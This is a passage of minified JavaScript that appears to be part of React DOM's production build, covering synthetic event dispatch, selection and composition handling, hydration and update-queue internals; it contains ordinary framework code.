function Lp(e, t) {
    if (e === "click") return ra(t)
}

function $p(e, t) {
    if (e === "input" || e === "change") return ra(t)
}

function Fp(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var nt = typeof Object.is == "function" ? Object.is : Fp;

function Pr(e, t) {
    if (nt(e, t)) return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var l = n[r];
        if (!Ja.call(t, l) || !nt(e[l], t[l])) return !1
    }
    return !0
}

function Ts(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e
}

function Ps(e, t) {
    var n = Ts(e);
    e = 0;
    for (var r; n;) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r
        }
        e: {
            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = Ts(n)
    }
}

function hc(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? hc(e, t.parentNode) : "contains" in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}

function vc() {
    for (var e = window, t = Pl(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n) e = t.contentWindow;
        else break;
        t = Pl(e.document)
    }
    return t
}

function vi(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}

function Op(e) {
    var t = vc(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && hc(n.ownerDocument.documentElement, n)) {
        if (r !== null && vi(n)) {
            if (t = r.start, e = r.end, e === void 0 && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window, e.getSelection) {
                e = e.getSelection();
                var l = n.textContent.length,
                    a = Math.min(r.start, l);
                r = r.end === void 0 ? a : Math.min(r.end, l), !e.extend && a > r && (l = r, r = a, a = l), l = Ps(n, a);
                var o = Ps(n, r);
                l && o && (e.rangeCount !== 1 || e.anchorNode !== l.node || e.anchorOffset !== l.offset || e.focusNode !== o.node || e.focusOffset !== o.offset) && (t = t.createRange(), t.setStart(l.node, l.offset), e.removeAllRanges(), a > r ? (e.addRange(t), e.extend(o.node, o.offset)) : (t.setEnd(o.node, o.offset), e.addRange(t)))
            }
        }
        for (t = [], e = n; e = e.parentNode;) e.nodeType === 1 && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++) e = t[n], e.element.scrollLeft = e.left, e.element.scrollTop = e.top
    }
}
var Rp = yt && "documentMode" in document && 11 >= document.documentMode,
    wn = null,
    yo = null,
    hr = null,
    wo = !1;

function js(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    wo || wn == null || wn !== Pl(r) || (r = wn, "selectionStart" in r && vi(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(), r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }), hr && Pr(hr, r) || (hr = r, r = Rl(yo, "onSelect"), 0 < r.length && (t = new pi("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = wn)))
}

function ll(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
}
var xn = {
        animationend: ll("Animation", "AnimationEnd"),
        animationiteration: ll("Animation", "AnimationIteration"),
        animationstart: ll("Animation", "AnimationStart"),
        transitionend: ll("Transition", "TransitionEnd")
    },
    _a = {},
    gc = {};
yt && (gc = document.createElement("div").style, "AnimationEvent" in window || (delete xn.animationend.animation, delete xn.animationiteration.animation, delete xn.animationstart.animation), "TransitionEvent" in window || delete xn.transitionend.transition);

function la(e) {
    if (_a[e]) return _a[e];
    if (!xn[e]) return e;
    var t = xn[e],
        n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in gc) return _a[e] = t[n];
    return e
}
var yc = la("animationend"),
    wc = la("animationiteration"),
    xc = la("animationstart"),
    kc = la("transitionend"),
    bc = new Map,
    _s = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

function Ht(e, t) {
    bc.set(e, t), dn(t, [e])
}
for (var La = 0; La < _s.length; La++) {
    var $a = _s[La],
        Mp = $a.toLowerCase(),
        zp = $a[0].toUpperCase() + $a.slice(1);
    Ht(Mp, "on" + zp)
}
Ht(yc, "onAnimationEnd");
Ht(wc, "onAnimationIteration");
Ht(xc, "onAnimationStart");
Ht("dblclick", "onDoubleClick");
Ht("focusin", "onFocus");
Ht("focusout", "onBlur");
Ht(kc, "onTransitionEnd");
Mn("onMouseEnter", ["mouseout", "mouseover"]);
Mn("onMouseLeave", ["mouseout", "mouseover"]);
Mn("onPointerEnter", ["pointerout", "pointerover"]);
Mn("onPointerLeave", ["pointerout", "pointerover"]);
dn("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
dn("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
dn("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
dn("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
dn("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
dn("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var ur = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    Dp = new Set("cancel close invalid load scroll toggle".split(" ").concat(ur));

function Ls(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, Mf(r, t, void 0, e), e.currentTarget = null
}

function Sc(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            l = r.event;
        r = r.listeners;
        e: {
            var a = void 0;
            if (t)
                for (var o = r.length - 1; 0 <= o; o--) {
                    var i = r[o],
                        s = i.instance,
                        u = i.currentTarget;
                    if (i = i.listener, s !== a && l.isPropagationStopped()) break e;
                    Ls(l, i, u), a = s
                } else
                    for (o = 0; o < r.length; o++) {
                        if (i = r[o], s = i.instance, u = i.currentTarget, i = i.listener, s !== a && l.isPropagationStopped()) break e;
                        Ls(l, i, u), a = s
                    }
        }
    }
    if (_l) throw e = mo, _l = !1, mo = null, e
}

function H(e, t) {
    var n = t[Eo];
    n === void 0 && (n = t[Eo] = new Set);
    var r = e + "__bubble";
    n.has(r) || (Ec(t, e, 2, !1), n.add(r))
}

function Fa(e, t, n) {
    var r = 0;
    t && (r |= 4), Ec(n, e, r, t)
}
var al = "_reactListening" + Math.random().toString(36).slice(2);

function jr(e) {
    if (!e[al]) {
        e[al] = !0, Lu.forEach(function(n) {
            n !== "selectionchange" && (Dp.has(n) || Fa(n, !1, e), Fa(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[al] || (t[al] = !0, Fa("selectionchange", !1, t))
    }
}

function Ec(e, t, n, r) {
    switch (ic(t)) {
        case 1:
            var l = Jf;
            break;
        case 4:
            l = qf;
            break;
        default:
            l = di
    }
    n = l.bind(null, t, n, e), l = void 0, !po || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (l = !0), r ? l !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: l
    }) : e.addEventListener(t, n, !0) : l !== void 0 ? e.addEventListener(t, n, {
        passive: l
    }) : e.addEventListener(t, n, !1)
}

function Oa(e, t, n, r, l) {
    var a = r;
    if (!(t & 1) && !(t & 2) && r !== null) e: for (;;) {
        if (r === null) return;
        var o = r.tag;
        if (o === 3 || o === 4) {
            var i = r.stateNode.containerInfo;
            if (i === l || i.nodeType === 8 && i.parentNode === l) break;
            if (o === 4)
                for (o = r.return; o !== null;) {
                    var s = o.tag;
                    if ((s === 3 || s === 4) && (s = o.stateNode.containerInfo, s === l || s.nodeType === 8 && s.parentNode === l)) return;
                    o = o.return
                }
            for (; i !== null;) {
                if (o = Jt(i), o === null) return;
                if (s = o.tag, s === 5 || s === 6) {
                    r = a = o;
                    continue e
                }
                i = i.parentNode
            }
        }
        r = r.return
    }
    Ku(function() {
        var u = a,
            d = ii(n),
            h = [];
        e: {
            var v = bc.get(e);
            if (v !== void 0) {
                var y = pi,
                    w = e;
                switch (e) {
                    case "keypress":
                        if (wl(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        y = mp;
                        break;
                    case "focusin":
                        w = "focus", y = Ta;
                        break;
                    case "focusout":
                        w = "blur", y = Ta;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        y = Ta;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        y = ws;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        y = np;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        y = gp;
                        break;
                    case yc:
                    case wc:
                    case xc:
                        y = ap;
                        break;
                    case kc:
                        y = wp;
                        break;
                    case "scroll":
                        y = ep;
                        break;
                    case "wheel":
                        y = kp;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        y = ip;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        y = ks
                }
                var x = (t & 4) !== 0,
                    S = !x && e === "scroll",
                    f = x ? v !== null ? v + "Capture" : null : v;
                x = [];
                for (var c = u, m; c !== null;) {
                    m = c;
                    var k = m.stateNode;
                    if (m.tag === 5 && k !== null && (m = k, f !== null && (k = Sr(c, f), k != null && x.push(_r(c, k, m)))), S) break;
                    c = c.return
                }
                0 < x.length && (v = new y(v, w, null, n, d), h.push({
                    event: v,
                    listeners: x
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (v = e === "mouseover" || e === "pointerover", y = e === "mouseout" || e === "pointerout", v && n !== co && (w = n.relatedTarget || n.fromElement) && (Jt(w) || w[wt])) break e;
                if ((y || v) && (v = d.window === d ? d : (v = d.ownerDocument) ? v.defaultView || v.parentWindow : window, y ? (w = n.relatedTarget || n.toElement, y = u, w = w ? Jt(w) : null, w !== null && (S = fn(w), w !== S || w.tag !== 5 && w.tag !== 6) && (w = null)) : (y = null, w = u), y !== w)) {
                    if (x = ws, k = "onMouseLeave", f = "onMouseEnter", c = "mouse", (e === "pointerout" || e === "pointerover") && (x = ks, k = "onPointerLeave", f = "onPointerEnter", c = "pointer"), S = y == null ? v : kn(y), m = w == null ? v : kn(w), v = new x(k, c + "leave", y, n, d), v.target = S, v.relatedTarget = m, k = null, Jt(d) === u && (x = new x(f, c + "enter", w, n, d), x.target = m, x.relatedTarget = S, k = x), S = k, y && w) t: {
                        for (x = y, f = w, c = 0, m = x; m; m = hn(m)) c++;
                        for (m = 0, k = f; k; k = hn(k)) m++;
                        for (; 0 < c - m;) x = hn(x),
                        c--;
                        for (; 0 < m - c;) f = hn(f),
                        m--;
                        for (; c--;) {
                            if (x === f || f !== null && x === f.alternate) break t;
                            x = hn(x), f = hn(f)
                        }
                        x = null
                    }
                    else x = null;
                    y !== null && $s(h, v, y, x, !1), w !== null && S !== null && $s(h, S, w, x, !0)
                }
            }
            e: {
                if (v = u ? kn(u) : window, y = v.nodeName && v.nodeName.toLowerCase(), y === "select" || y === "input" && v.type === "file") var N = Pp;
                else if (Es(v))
                    if (pc) N = $p;
                    else {
                        N = _p;
                        var C = jp
                    }
                else(y = v.nodeName) && y.toLowerCase() === "input" && (v.type === "checkbox" || v.type === "radio") && (N = Lp);
                if (N && (N = N(e, u))) {
                    fc(h, N, n, d);
                    break e
                }
                C && C(e, v, u),
                e === "focusout" && (C = v._wrapperState) && C.controlled && v.type === "number" && ao(v, "number", v.value)
            }
            switch (C = u ? kn(u) : window, e) {
                case "focusin":
                    (Es(C) || C.contentEditable === "true") && (wn = C, yo = u, hr = null);
                    break;
                case "focusout":
                    hr = yo = wn = null;
                    break;
                case "mousedown":
                    wo = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    wo = !1, js(h, n, d);
                    break;
                case "selectionchange":
                    if (Rp) break;
                case "keydown":
                case "keyup":
                    js(h, n, d)
            }
            var j;
            if (hi) e: {
                switch (e) {
                    case "compositionstart":
                        var E = "onCompositionStart";
                        break e;
                    case "compositionend":
                        E = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        E = "onCompositionUpdate";
                        break e
                }
                E = void 0
            }
            else yn ? cc(e, n) && (E = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (E = "onCompositionStart");E && (uc && n.locale !== "ko" && (yn || E !== "onCompositionStart" ? E === "onCompositionEnd" && yn && (j = sc()) : (_t = d, fi = "value" in _t ? _t.value : _t.textContent, yn = !0)), C = Rl(u, E), 0 < C.length && (E = new xs(E, e, null, n, d), h.push({
                event: E,
                listeners: C
            }), j ? E.data = j : (j = dc(n), j !== null && (E.data = j)))),
            (j = Sp ? Ep(e, n) : Np(e, n)) && (u = Rl(u, "onBeforeInput"), 0 < u.length && (d = new xs("onBeforeInput", "beforeinput", null, n, d), h.push({
                event: d,
                listeners: u
            }), d.data = j))
        }
        Sc(h, t)
    })
}

function _r(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}

function Rl(e, t) {
    for (var n = t + "Capture", r = []; e !== null;) {
        var l = e,
            a = l.stateNode;
        l.tag === 5 && a !== null && (l = a, a = Sr(e, n), a != null && r.unshift(_r(e, a, l)), a = Sr(e, t), a != null && r.push(_r(e, a, l))), e = e.return
    }
    return r
}

function hn(e) {
    if (e === null) return null;
    do e = e.return; while (e && e.tag !== 5);
    return e || null
}

function $s(e, t, n, r, l) {
    for (var a = t._reactName, o = []; n !== null && n !== r;) {
        var i = n,
            s = i.alternate,
            u = i.stateNode;
        if (s !== null && s === r) break;
        i.tag === 5 && u !== null && (i = u, l ? (s = Sr(n, a), s != null && o.unshift(_r(n, s, i))) : l || (s = Sr(n, a), s != null && o.push(_r(n, s, i)))), n = n.return
    }
    o.length !== 0 && e.push({
        event: t,
        listeners: o
    })
}
var Ip = /\r\n?/g,
    Ap = /\u0000|\uFFFD/g;

function Fs(e) {
    return (typeof e == "string" ? e : "" + e).replace(Ip, `
`).replace(Ap, "")
}

function ol(e, t, n) {
    if (t = Fs(t), Fs(e) !== t && n) throw Error(b(425))
}

function Ml() {}
var xo = null,
    ko = null;

function bo(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var So = typeof setTimeout == "function" ? setTimeout : void 0,
    Wp = typeof clearTimeout == "function" ? clearTimeout : void 0,
    Os = typeof Promise == "function" ? Promise : void 0,
    Up = typeof queueMicrotask == "function" ? queueMicrotask : typeof Os < "u" ? function(e) {
        return Os.resolve(null).then(e).catch(Hp)
    } : So;

function Hp(e) {
    setTimeout(function() {
        throw e
    })
}

function Ra(e, t) {
    var n = t,
        r = 0;
    do {
        var l = n.nextSibling;
        if (e.removeChild(n), l && l.nodeType === 8)
            if (n = l.data, n === "/$") {
                if (r === 0) {
                    e.removeChild(l), Cr(t);
                    return
                }
                r--
            } else n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = l
    } while (n);
    Cr(t)
}

function Mt(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3) break;
        if (t === 8) {
            if (t = e.data, t === "$" || t === "$!" || t === "$?") break;
            if (t === "/$") return null
        }
    }
    return e
}

function Rs(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0) return e;
                t--
            } else n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var Kn = Math.random().toString(36).slice(2),
    ot = "__reactFiber$" + Kn,
    Lr = "__reactProps$" + Kn,
    wt = "__reactContainer$" + Kn,
    Eo = "__reactEvents$" + Kn,
    Bp = "__reactListeners$" + Kn,
    Vp = "__reactHandles$" + Kn;

function Jt(e) {
    var t = e[ot];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[wt] || n[ot]) {
            if (n = t.alternate, t.child !== null || n !== null && n.child !== null)
                for (e = Rs(e); e !== null;) {
                    if (n = e[ot]) return n;
                    e = Rs(e)
                }
            return t
        }
        e = n, n = e.parentNode
    }
    return null
}

function Hr(e) {
    return e = e[ot] || e[wt], !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}

function kn(e) {
    if (e.tag === 5 || e.tag === 6) return e.stateNode;
    throw Error(b(33))
}

function aa(e) {
    return e[Lr] || null
}
var No = [],
    bn = -1;

function Bt(e) {
    return {
        current: e
    }
}

function B(e) {
    0 > bn || (e.current = No[bn], No[bn] = null, bn--)
}

function U(e, t) {
    bn++, No[bn] = e.current, e.current = t
}
var Ut = {},
    ve = Bt(Ut),
    Ne = Bt(!1),
    an = Ut;

function zn(e, t) {
    var n = e.type.contextTypes;
    if (!n) return Ut;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var l = {},
        a;
    for (a in n) l[a] = t[a];
    return r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = l), l
}

function Ce(e) {
    return e = e.childContextTypes, e != null
}

function zl() {
    B(Ne), B(ve)
}

function Ms(e, t, n) {
    if (ve.current !== Ut) throw Error(b(168));
    U(ve, t), U(Ne, n)
}

function Nc(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, typeof r.getChildContext != "function") return n;
    r = r.getChildContext();
    for (var l in r)
        if (!(l in t)) throw Error(b(108, jf(e) || "Unknown", l));
    return Y({}, n, r)
}

function Dl(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || Ut, an = ve.current, U(ve, e), U(Ne, Ne.current), !0
}

function zs(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(b(169));
    n ? (e = Nc(e, t, an), r.__reactInternalMemoizedMergedChildContext = e, B(Ne), B(ve), U(ve, e)) : B(Ne), U(Ne, n)
}
var ft = null,
    oa = !1,
    Ma = !1;

function Cc(e) {
    ft === null ? ft = [e] : ft.push(e)
}

function Qp(e) {
    oa = !0, Cc(e)
}

function Vt() {
    if (!Ma && ft !== null) {
        Ma = !0;
        var e = 0,
            t = D;
        try {
            var n = ft;
            for (D = 1; e < n.length; e++) {
                var r = n[e];
                do r = r(!0); while (r !== null)
            }
            ft = null, oa = !1
        } catch (l) {
            throw ft !== null && (ft = ft.slice(e + 1)), Zu(si, Vt), l
        } finally {
            D = t, Ma = !1
        }
    }
    return null
}
var Sn = [],
    En = 0,
    Il = null,
    Al = 0,
    Ie = [],
    Ae = 0,
    on = null,
    mt = 1,
    ht = "";

function Xt(e, t) {
    Sn[En++] = Al, Sn[En++] = Il, Il = e, Al = t
}

function Tc(e, t, n) {
    Ie[Ae++] = mt, Ie[Ae++] = ht, Ie[Ae++] = on, on = e;
    var r = mt;
    e = ht;
    var l = 32 - et(r) - 1;
    r &= ~(1 << l), n += 1;
    var a = 32 - et(t) + l;
    if (30 < a) {
        var o = l - l % 5;
        a = (r & (1 << o) - 1).toString(32), r >>= o, l -= o, mt = 1 << 32 - et(t) + l | n << l | r, ht = a + e
    } else mt = 1 << a | n << l | r, ht = e
}

function gi(e) {
    e.return !== null && (Xt(e, 1), Tc(e, 1, 0))
}

function yi(e) {
    for (; e === Il;) Il = Sn[--En], Sn[En] = null, Al = Sn[--En], Sn[En] = null;
    for (; e === on;) on = Ie[--Ae], Ie[Ae] = null, ht = Ie[--Ae], Ie[Ae] = null, mt = Ie[--Ae], Ie[Ae] = null
}
var Fe = null,
    $e = null,
    V = !1,
    Je = null;

function Pc(e, t) {
    var n = We(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, t = e.deletions, t === null ? (e.deletions = [n], e.flags |= 16) : t.push(n)
}

function Ds(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t, t !== null ? (e.stateNode = t, Fe = e, $e = Mt(t.firstChild), !0) : !1;
        case 6:
            return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t, t !== null ? (e.stateNode = t, Fe = e, $e = null, !0) : !1;
        case 13:
            return t = t.nodeType !== 8 ? null : t, t !== null ? (n = on !== null ? {
                id: mt,
                overflow: ht
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, n = We(18, null, null, 0), n.stateNode = t, n.return = e, e.child = n, Fe = e, $e = null, !0) : !1;
        default:
            return !1
    }
}

function Co(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}

function To(e) {
    if (V) {
        var t = $e;
        if (t) {
            var n = t;
            if (!Ds(e, t)) {
                if (Co(e)) throw Error(b(418));
                t = Mt(n.nextSibling);
                var r = Fe;
                t && Ds(e, t) ? Pc(r, n) : (e.flags = e.flags & -4097 | 2, V = !1, Fe = e)
            }
        } else {
            if (Co(e)) throw Error(b(418));
            e.flags = e.flags & -4097 | 2, V = !1, Fe = e
        }
    }
}

function Is(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13;) e = e.return;
    Fe = e
}

function il(e) {
    if (e !== Fe) return !1;
    if (!V) return Is(e), V = !0, !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type, t = t !== "head" && t !== "body" && !bo(e.type, e.memoizedProps)), t && (t = $e)) {
        if (Co(e)) throw jc(), Error(b(418));
        for (; t;) Pc(e, t), t = Mt(t.nextSibling)
    }
    if (Is(e), e.tag === 13) {
        if (e = e.memoizedState, e = e !== null ? e.dehydrated : null, !e) throw Error(b(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            $e = Mt(e.nextSibling);
                            break e
                        }
                        t--
                    } else n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            $e = null
        }
    } else $e = Fe ? Mt(e.stateNode.nextSibling) : null;
    return !0
}

function jc() {
    for (var e = $e; e;) e = Mt(e.nextSibling)
}

function Dn() {
    $e = Fe = null, V = !1
}

function wi(e) {
    Je === null ? Je = [e] : Je.push(e)
}
var Kp = bt.ReactCurrentBatchConfig;

function Xe(e, t) {
    if (e && e.defaultProps) {
        t = Y({}, t), e = e.defaultProps;
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
var Wl = Bt(null),
    Ul = null,
    Nn = null,
    xi = null;

function ki() {
    xi = Nn = Ul = null
}

function bi(e) {
    var t = Wl.current;
    B(Wl), e._currentValue = t
}

function Po(e, t, n) {
    for (; e !== null;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return
    }
}

function On(e, t) {
    Ul = e, xi = Nn = null, e = e.dependencies, e !== null && e.firstContext !== null && (e.lanes & t && (Ee = !0), e.firstContext = null)
}

function Be(e) {
    var t = e._currentValue;
    if (xi !== e)
        if (e = {
                context: e,
                memoizedValue: t,
                next: null
            }, Nn === null) {
            if (Ul === null) throw Error(b(308));
            Nn = e, Ul.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else Nn = Nn.next = e;
    return t
}
var qt = null;

function Si(e) {
    qt === null ? qt = [e] : qt.push(e)
}

function _c(e, t, n, r) {
    var l = t.interleaved;
    return l === null ? (n.next = n, Si(t)) : (n.next = l.next, l.next = n), t.interleaved = n, xt(e, r)
}

function xt(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null;) e.childLanes |= t, n = e.alternate, n !== null && (n.childLanes |= t), n = e, e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var Ct = !1;

function Ei(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}

function Lc(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}

function vt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}

function zt(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (r = r.shared, M & 2) {
        var l = r.pending;
        return l === null ? t.next = t : (t.next = l.next, l.next = t), r.pending = t, xt(e, n)
    }
    return l = r.interleaved, l === null ? (t.next = t, Si(r)) : (t.next = l.next, l.next = t), r.interleaved = t, xt(e, n)
}

function xl(e, t, n) {
    if (t = t.updateQueue, t !== null && (t = t.shared, (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, ui(e, n)
    }
}

function As(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && (r = r.updateQueue, n === r)) {
        var l = null,
            a = null;
        if (n = n.firstBaseUpdate, n !== null) {
            do {
                var o = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                a === null ? l = a = o : a = a.next = o, n = n.next
            } while (n !== null);
            a === null ? l = a = t : a = a.next = t
        } else l = a = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: l,
            lastBaseUpdate: a,
            shared: r.shared,
            effects: r.effects
        }, e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate, e === null ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
}

function Hl(e, t, n, r) {
    var l = e.updateQueue;
    Ct = !1;
    var a = l.firstBaseUpdate,
        o = l.lastBaseUpdate,
        i = l.shared.pending;
    if (i !== null) {
        l.shared.pending = null;
        var s = i,
            u = s.next;
        s.next = null, o === null ? a = u : o.next = u, o = s;
        var d = e.alternate;
        d !== null && (d = d.updateQueue, i = d.lastBaseUpdate, i !== o && (i === null ? d.firstBaseUpdate = u : i.next = u, d.lastBaseUpdate = s))
    }
    if (a !== null) {
        var h = l.baseState;
        o = 0, d = u = s = null, i = a;
        do {
            var v = i.lane,
                y = i.eventTime;
            if ((r & v) === v) {
                d !== null && (d = d.next = {
                    eventTime: y,
                    lane: 0,
                    tag: i.tag,
                    payload: i.payload,
                    callback: i.callback,
                    next: null
                });
                e: {
                    var w = e,
                        x = i;
                    switch (v = t, y = n, x.tag) {
                        case 1:
                            if (w = x.payload, typeof w == "function") {
                                h = w.call(y, h, v);
                                break e
                            }
                            h = w;
                            break e;
                        case 3:
                            w.flags = w.flags & -65537 | 128;
                        case 0:
                            if (w = x.payload, v = typeof w == "function" ? w.call(y, h, v) : w, v == null) break e;
                            h = Y({}, h, v);
                            break e;
                        case 2:
                            Ct = !0
                    }
                }
                i.callback !== null && i.lane !== 0 && (e.flags |= 64, v = l.effects, v === null ? l.effects = [i] : v.push(i))
            } else y = {
                eventTime: y,
                lane: v,
                tag: i.tag,
                payload: i.payload,
                callback: i.callback,
                next: null
            }, d === null ? (u = d = y, s = h) : d = d.next = y, o |= v;
            if (i = i.next, i === null) {
                if (i = l.shared.pending, i === null) break;
                v = i, i = v.next, v.next = null, l.lastBaseUpdate = v, l.shared.pending = null
            }
        } while (!0);
        if (d === null && (s = h), l.baseState = s, l.firstBaseUpdate = u, l.lastBaseUpdate = d, t = l.shared.interleaved, t !== null) {
            l = t;
            do o |= l.lane, l = l.next; while (l !== t)
        } else a === null && (l.shared.lanes = 0);
        un |= o, e.lanes = o, e.memoizedState = h
    }
}

function Ws(e, t, n) {
    if (e = t.effects, t.effects = null, e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                l = r.callback;
            if (l !== null) {
